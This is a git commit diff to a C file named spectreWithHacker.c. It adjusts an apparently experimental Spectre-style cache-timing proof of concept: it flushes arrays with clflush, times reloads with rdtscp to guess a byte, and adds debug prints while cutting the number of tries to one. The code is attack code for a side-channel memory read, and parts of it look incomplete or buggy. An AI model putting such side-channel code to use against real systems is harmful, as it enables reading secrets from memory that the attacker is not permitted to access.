fa1356009e512b967afd6878363814245ce8a1b9
Amit Bergman <ambergma@microsoft.com>
2021-03-28 12:03:43 +0300

    changes

--- spectreWithHacker.c
+++ spectreWithHacker.c
@@ -55,35 +55,36 @@ Analysis code
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
-  int tries, i, j, k, mix_i, junk;
+  int tries, i, j, k, mix_i, junk = 0;
   uint8_t data = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-  bigArray[4096] = 100;
+  bigArray[4096] = 101;
 
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
-  for (tries = 999; tries > 0; tries--) {
-
+  for (tries = 1; tries > 0; tries--) {
+      
+    results[0] = 0;
     /* Flush big array[4096*(0..255)] from cache */
     for (i = 0; i < 4096; i++)
       _mm_clflush( & bigArray[i * 512]); /* intrinsic for clflush instruction */
-    /* Flush big array[4096*(0..255)] from cache */
-    for (i = 0; i < 512; i++)
-      _mm_clflush( & array2[256 * 512]); /* intrinsic for clflush instruction */
+    /* Flush array2[4096*(0..255)] from cache */
+    for (i = 0; i < 256; i++)
+      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
         
     /* Call the victim! */
     //victim_function(); //store in big[0]
-    bigArray[0] = 'c';
-
+    bigArray[0] = 'q';
 
     addr = &bigArray[4096];
-    data = *addr;
-    //Now the data from bigArray[0] is supposed to temporary be in (data) so we will access this point
 
+    data = *addr;
+    //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
+    printf("data is %c = %d", data, data);
     temp &= array2[data * 512];
 
     //Now we accessed the point in the memory that is correlated with the data in big[0]
@@ -98,6 +99,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
         if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
             results[mix_i]++; /* cache hit - add +1 to score for this value */
+            printf("got here with: %d \n", mix_i);
         }
     }
   }
@@ -150,7 +152,7 @@ int main(int argc, const char * * argv) {
 
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=%c score=%d ", value[0],
-        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+          (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     printf("(second best: 0x%02X=%c score=%d)", value[1], value[1], score[1]);
     printf("(third best: 0x%02X=%c score=%d)", value[2],value[2], score[2]);
     
